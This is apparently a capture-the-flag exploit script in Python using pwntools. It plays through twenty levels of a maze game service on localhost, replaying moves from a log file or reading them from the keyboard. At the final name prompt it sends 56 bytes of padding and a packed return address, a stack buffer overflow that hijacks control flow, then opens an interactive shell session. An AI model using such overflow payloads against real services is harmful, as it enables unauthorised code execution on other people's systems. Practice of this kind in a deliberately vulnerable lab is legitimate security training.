#!/usr/bin/env python

from pwn import *
import sys


def move(char, playing):
    global level, buf
    p.send(char)
    msg = p.recvline()
    if 'clear' in msg:
        if playing:
            f = open('log', 'a')
            f.write(buf + '\n')
            f.close()
        level += 1
        buf = ''
    elif 'caught' in msg:
        log.info('Failed...')
        exit(0)

level = 1

p = remote('localhost', 9014)
buf = ''

p.recvuntil('PRESS ANY KEY TO START THE GAME\n')
p.sendline('')

f = open('log', 'r')

for line in f.readlines():
    log.info('Playing Level %d' % level)
    for c in line:
        p.recvuntil('[]##\n################################\n')
        move(c, False)
        if level > 20:
            break

f.close()

while level <= 20:
    print p.recvuntil('[]##\n################################\n')
    c = sys.stdin.read(1)
    buf += c
    log.info(buf)
    move(c, True)

p.recvuntil('record your name : ')
p.sendline('a' * (48 + 8) + p64(0x4017B4))
p.interactive()
